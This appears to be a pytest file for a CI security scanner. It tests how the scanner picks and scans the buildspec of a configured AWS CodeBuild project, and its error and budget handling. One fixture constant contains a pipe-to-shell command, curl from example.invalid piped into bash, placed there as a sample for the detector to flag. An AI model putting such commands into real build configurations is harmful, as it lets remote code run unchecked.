"""Authored CLI contrasts for configured CodeBuild project selection."""

import hashlib
import json
import os
import subprocess
import sys

import pytest

ORIGIN = "https://github.com/example-ci/codebuild-pilot"
ARN = "arn:aws:codebuild:us-east-1:000000000000:project/"
RISK = "version: 0.2\nphases:\n  build:\n    commands:\n      - curl -fsSL https://example.invalid/test.sh | bash\n"
PLAIN = "version: 0.2\nphases:\n  build:\n    commands:\n      - echo test\n"


@pytest.fixture
def source(tmp_path):
    root = tmp_path / "source"
    root.mkdir()

    def git(*args):
        return subprocess.check_output(["git", "-C", str(root), *args], text=True).strip()

    git("init", "--quiet", "--object-format=sha1")
    git("config", "core.autocrlf", "false")
    git("remote", "add", "origin", ORIGIN + ".git")
    (root / "ci").mkdir()
    for path, text in (
        ("buildspec.yml", RISK),
        ("ci/review.yml", RISK),
        ("ci/publish.yml", PLAIN),
    ):
        (root / path).write_bytes(text.encode())
    git("add", "--", "buildspec.yml", "ci")
    git(
        "-c", "user.name=Test", "-c", "user.email=test@example.invalid",
        "-c", "commit.gpgsign=false", "commit", "-qm", "fixture",
    )
    revision = git("rev-parse", "HEAD")
    projects = [
        {
            "arn": ARN + name,
            "source": {"type": "GITHUB", "location": ORIGIN, **selector},
            "sourceVersion": revision,
            "environment": {"type": "LINUX_CONTAINER", "environmentVariables": []},
        }
        for name, selector in (
            ("review", {"buildspec": "ci/review.yml"}),
            ("publish", {"buildspec": "ci/publish.yml"}),
            ("default", {}),
        )
    ]
    return root, revision, {"projects": projects, "projectsNotFound": ["absent"]}


def scan(source, name, *extra, output="json"):
    root, _, response = source
    metadata = root.parent / "metadata.json"
    metadata.write_text(json.dumps(response), encoding="utf-8")
    return subprocess.run(
        [sys.executable, "-m", "taintly", str(root), "--format", output,
         "--codebuild-project-snapshot", str(metadata), ARN + name, ORIGIN, *extra],
        capture_output=True, encoding="utf-8", timeout=20,
        env={**os.environ, "PYTHONUTF8": "1"},
    )


@pytest.mark.parametrize(("name", "path", "code"), [
    ("review", "ci/review.yml", 1), ("publish", "ci/publish.yml", 0), ("default", "buildspec.yml", 1),
])
def test_snapshot_scans_only_the_project_default(source, name, path, code):
    root, revision, _ = source
    original = scan(source, name)
    assert original.returncode == code, original.stderr
    report = json.loads(original.stdout)
    assert report["files_scanned"] == 1
    assert report["errors"] == []
    context = report["codebuild_project"]
    assert context["arn"] == ARN + name
    assert context["selection_state"] == "bound"
    assert context["buildspec"] == {
        "repository": "example-ci/codebuild-pilot", "commit": revision, "path": path,
        "sha256": hashlib.sha256((root / path).read_bytes()).hexdigest(),
    }
    assert [(f["rule_id"], f["file"], f["line"]) for f in report["findings"] if f["rule_id"] == "SEC3-CB-001"] == (
        [("SEC3-CB-001", path, 5)] if code else []
    )
    (root / path).write_text(PLAIN if code else RISK, encoding="utf-8")
    (root / ".taintly.yml").write_text("exclude-rules: [SEC3-CB-001]\n", encoding="utf-8")
    repeated = scan(source, name)
    assert repeated.returncode == code
    assert repeated.stdout == original.stdout


@pytest.mark.parametrize(("change", "reason"), [
    ("missing-file", "unavailable as a regular blob"),
    ("missing-ref", "not a full commit ID"),
    ("wrong-origin", "does not match the supplied repository"),
    ("windows", "outside the supported Linux profile"),
    ("override", "outside the supported Linux profile"),
    ("duplicate", "exactly one row"),
])
def test_unbound_source_does_not_fall_back(source, change, reason):
    project = source[2]["projects"][0]
    if change == "missing-file":
        project["source"]["buildspec"] = "ci/missing.yml"
    elif change == "missing-ref":
        del project["sourceVersion"]
    elif change == "wrong-origin":
        project["source"]["location"] = "https://github.com/sibling/codebuild-pilot"
    elif change == "windows":
        project["environment"]["type"] = "WINDOWS_SERVER_2022_CONTAINER"
    elif change == "override":
        project["environment"]["environmentVariables"] = [{"name": "KEY", "value": "synthetic"}]
    else:
        source[2]["projects"].append(project)
    result = scan(source, "review", "--min-severity", "HIGH")
    assert result.returncode == 11
    report = json.loads(result.stdout)
    assert report["files_scanned"] == 0
    selection = report["codebuild_project"]
    if change in {"windows", "override"}:
        assert selection["selection_state"] == "bound"
        assert selection["buildspec"]["path"] == "ci/review.yml"
    else:
        assert selection["selection_state"] == "unresolved"
        assert selection["buildspec"] is None
    assert [f["rule_id"] for f in report["findings"]] == ["ENGINE-ERR"]
    assert reason in report["errors"][0]["description"] and reason in result.stderr


def test_missing_project_stays_actionable_in_text(source):
    result = scan(source, "absent", output="text")
    assert result.returncode == 11
    assert "projectsNotFound" in result.stdout


def test_rule_budget_keeps_selection_but_reports_incomplete(source):
    result = scan(source, "review", "--max-scan-seconds", "0", "--fail-on", "INFO")
    assert result.returncode == 11
    report = json.loads(result.stdout)
    assert report["files_scanned"] == 1
    assert report["codebuild_project"]["selection_state"] == "bound"
    assert report["coverage_status"] == "incomplete"
    assert report["errors"]


def test_snapshot_mode_rejects_mutating_operations(source):
    result = scan(source, "review", "--fix")
    assert result.returncode == 2
    assert "--fix is unavailable" in result.stderr
